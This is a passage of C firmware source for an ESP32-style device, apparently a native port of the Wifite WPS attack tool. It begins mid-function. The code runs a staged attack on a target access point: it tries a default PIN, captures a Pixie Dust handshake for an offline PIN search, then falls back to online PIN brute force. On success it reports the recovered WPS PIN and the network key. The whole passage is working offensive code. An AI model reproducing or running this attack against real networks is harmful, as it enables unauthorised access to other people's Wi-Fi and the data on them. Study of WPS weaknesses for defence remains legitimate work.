  while (!cancelled(j) && wf_brute_pin(&b, j->pin)) {
    if (!fresh_target(j))
      break;
    logline(j, "[PIN] %s phase=%u attempt=%u", j->pin, b.phase + 1, ++attempts);
    if (exchange(j, j->pin)) {
      checkpoint(j, &b, false, true);
      return true;
    }
    if (cancelled(j) || j->outcome == 3)
      break;
    if (wf_brute_next(&b, j->outcome)) {
      ambiguous = 0;
      if (attempts % 10 == 0 || b.phase)
        checkpoint(j, &b, false, false);
    } else {
      if (j->outcome == 1 && b.phase) {
        logline(j, "[STOP] PIN evidence contradicts first half");
        break;
      }
      if (++ambiguous >= 3) {
        logline(j, "[STOP] 3 ambiguous attempts; PIN not skipped");
        logline(j, "[BRUTE] Paused at %s; no reliable PIN verdict", j->pin);
        break;
      }
      logline(j, "[RETRY] Same PIN: no conclusive rejection");
    }
    for (unsigned i = 0; i < 20 && !cancelled(j); i++)
      wf_delay(100);
  }
  if (!wf_brute_pin(&b, j->pin)) {
    logline(j, "[EXHAUSTED] Standard checksum PIN space");
    checkpoint(j, &b, false, true);
  } else
    checkpoint(j, &b, false, false);
  return false;
}
static void result(WifiteJob *j, const char *label, const char *value) {
  WifiteEvent e = {.type = WifiteResult};
  snprintf(e.text, sizeof(e.text), "%s%s", label, value);
  /* Results are not discarded due to an ordinary full queue. */
  while (wf_queue_put(j->events, &e, 100) != pdTRUE)
    if (cancelled(j))
      break;
}
/* A failed association must not leave the next Auto stage using the same
 * driver session. Release the lease, then acquire a fresh radio/WPS context. */
static bool next_online_stage(WifiteJob *j) {
  if (cancelled(j) || j->outcome == 3)
    return false;
  logline(j, "[AUTO] Reinitializing radio for the next stage");
  radio_close(j);
  for (unsigned i = 0; i < 20 && !cancelled(j); i++)
    wf_delay(100);
  if (cancelled(j) || !radio_open(j))
    return false;
  return fresh_target(j);
}
static int32_t work(void *ctx) {
  WifiteJob *j = ctx;
  logline(j, "WIFITE 0.8 native EXPERIMENTAL");
  if (cancelled(j) || !radio_open(j))
    goto finish;
  if (j->mode == WifiteScan) {
    scan(j);
    goto finish;
  }
  logline(j, "[LINK] ESP-IDF WPS task + registrar adapter");
  if (!fresh_target(j))
    goto finish;
  logline(j, "[TARGET] %02X:%02X:%02X:%02X:%02X:%02X CH%u", j->target.bssid[0],
          j->target.bssid[1], j->target.bssid[2], j->target.bssid[3],
          j->target.bssid[4], j->target.bssid[5], j->target.channel);
  bool recovered = false;
  if (j->mode == WifiteAuto || j->mode == WifitePixie ||
      j->mode == WifitePixieFull || j->mode == WifiteBruteforce) {
    logline(j, j->mode == WifiteAuto ? "[AUTO 1/3] Testing PIN 12345670"
                                    : "[FIRST] Testing PIN 12345670");
    memcpy(j->pin, "12345670", 9);
    recovered = exchange(j, j->pin);
    if (recovered || cancelled(j) || j->outcome == 3)
      goto report;
    if (j->mode == WifiteAuto) {
      if (j->outcome == 1 || j->outcome == 2)
        logline(j, "[AUTO] Default PIN rejected; moving to Pixie Dust");
      else
        logline(j, "[AUTO] First PIN unverified; trying a fresh Pixie session");
    } else {
      logline(j, "[NEXT] Starting selected mode with a fresh session");
    }
    if (!next_online_stage(j))
      goto report;
  }
  if (j->mode == WifitePixie || j->mode == WifiteAuto ||
      j->mode == WifitePixieFull) {
    if (j->mode == WifiteAuto)
      logline(j, "[AUTO 2/3] Pixie Dust");
    logline(j, "[MODE] Native Pixiewps PRNG families");
    logline(j, "[PIXIE] Capturing WPS M1/M3 for offline search");
    if (!exchange(j, NULL)) {
      logline(j, "[PIXIE] No valid M3 capture; offline search not run");
      if (j->mode == WifiteAuto && !cancelled(j) && j->outcome != 3) {
        logline(j, "[AUTO] Capture failed; trying bounded online PIN stage");
        goto auto_brute;
      }
      goto report;
    }
    radio_close(j);
    logline(j, "[OFFLINE] Radio exchange complete");
    logline(j, "[PIXIE] Valid M3 captured; offline search starting");
    uint32_t epoch = (uint32_t)time(NULL);
    logline(j, "[CLOCK] RTL quick window around %lu", (unsigned long)epoch);
    int r = wf_pixie_all(j->session, j->mode == WifitePixieFull, epoch,
                         solver_progress, j);
    if (r < 0) {
      logline(j, r == -1 ? "[STOP] Pixie search cancelled"
                         : "[ERR] Offline crypto failure");
      goto finish;
    }
    if (r > 0) {
      memcpy(j->pin, j->session->pin, 9);
      result(j, "WPS PIN: ", j->pin[0] ? j->pin : "<empty>");
      logline(j, "[MATCH] Both E-Hashes match (mode %d)", r);
      if (cancelled(j) || !radio_open(j) || !fresh_target(j))
        goto finish;
      logline(j, "[VERIFY] New session with recovered PIN");
      recovered = exchange(j, j->pin);
    } else {
      logline(j, "[NO MATCH] No PIN in completed search scope");
      if (j->mode != WifiteAuto || cancelled(j))
        goto finish;
      goto auto_brute;
    }
  } else if (j->mode == WifiteBruteforce)
    recovered = brute_force(j);
  else {
    logline(j, "[MODE] One supplied PIN");
    recovered = exchange(j, j->pin);
  }
  goto report;
auto_brute:
  logline(j, "[AUTO 3/3] Online PIN brute force (resume)");
  if (!next_online_stage(j))
    goto report;
  recovered = brute_force(j);
report:
  if (recovered) {
    result(j, "WPS PIN: ", j->pin[0] ? j->pin : "<empty>");
    char key[65];
    for (unsigned i = 0; i < j->session->key_len; i++) {
      unsigned c = (uint8_t)j->session->key[i];
      key[i] = c >= 32 && c < 127 ? c : '?';
    }
    key[j->session->key_len] = 0;
    result(j, "NETWORK KEY: ", key);
    wf_wipe(key, sizeof(key));
  } else
    logline(j, "[RESULT] Network key not recovered");

finish:
  radio_close(j);
  unsigned dropped = __atomic_load_n(&j->dropped, __ATOMIC_RELAXED);
  if (dropped)
    logline(j, "[RX] %u queued frames dropped", dropped);
  if (j->log_dropped)
    logline(j, "[LOG] %u progress lines dropped", j->log_dropped);
  logline(j, cancelled(j) ? "[STOPPED] Resources released"
                          : "[DONE] Resources released");
  wf_wipe(j->session, sizeof(*j->session));
  wf_wipe(j->pin, sizeof(j->pin));
  __atomic_store_n(&j->finished, 1, __ATOMIC_RELEASE);
  return 0;
}
static void task_main(void *ctx) {
  WifiteJob *j = ctx;
  work(j);
  vTaskDelete(NULL);
}
WifiteJob *wifite_start(WifiteMode mode, const WfTarget *target,
                        const char *pin) {
  if (mode < WifiteScan || mode > WifitePixieFull)
    return NULL;
  if (mode != WifiteScan && (!target || target->channel < 1 ||
                             target->channel > 14 || target->ssid_len > 32))
    return NULL;
  if (mode == WifiteVerifyPin) {
    if (!pin || strlen(pin) != 8)
      return NULL;
    for (unsigned i = 0; i < 8; i++)
      if (pin[i] < '0' || pin[i] > '9')
        return NULL;
  }
  WifiteJob *j =
      heap_caps_calloc(1, sizeof(*j), MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
  if (!j)
    return NULL;
  j->mode = mode;
  if (target) {
    j->target = *target;
    memcpy(j->bssid, target->bssid, 6);
  }
  if (mode == WifiteVerifyPin)
    memcpy(j->pin, pin, 9);
  j->events = xQueueCreate(24, sizeof(WifiteEvent));
  j->session = calloc(1, sizeof(WfSession));
  j->scratch = calloc(1, sizeof(Frame));
  j->eap_scratch = calloc(1, sizeof(Frame));
  j->frame = calloc(1, sizeof(Frame));
  j->rx_storage = malloc(4 * sizeof(Frame));
  if (j->rx_storage)
    j->rx = xQueueCreateStatic(4, sizeof(Frame), j->rx_storage, &j->rx_control);
  if (!j->events || !j->session || !j->scratch || !j->eap_scratch || !j->frame || !j->rx) {
    __atomic_store_n(&j->finished, 1, __ATOMIC_RELEASE);
    wifite_free(j);
    return NULL;
  }
  if (xTaskCreate(task_main, "WIFITE", 24576, j, 1, &j->thread) != pdPASS) {
    __atomic_store_n(&j->finished, 1, __ATOMIC_RELEASE);
    wifite_free(j);
    return NULL;
  }
  return j;
}
bool wifite_poll(WifiteJob *j, WifiteEvent *e) {
  return j && e && wf_queue_get(j->events, e, 0) == pdTRUE;
}
void wifite_cancel(WifiteJob *j) {
  if (j)
    __atomic_store_n(&j->cancel, 1, __ATOMIC_RELEASE);
}
bool wifite_finished(WifiteJob *j) {
  return !j || __atomic_load_n(&j->finished, __ATOMIC_ACQUIRE) != 0;
}
void wifite_free(WifiteJob *j) {
  if (!j || !wifite_finished(j))
    return;

  if (j->events)
    vQueueDelete(j->events);
  if (j->rx)
    vQueueDelete(j->rx);
  free(j->rx_storage);
  free(j->scratch);
  free(j->eap_scratch);
  free(j->frame);
  if (j->session) {
    wf_wipe(j->session, sizeof(*j->session));
    free(j->session);
  }
  wf_wipe(j, sizeof(*j));
  heap_caps_free(j);
}
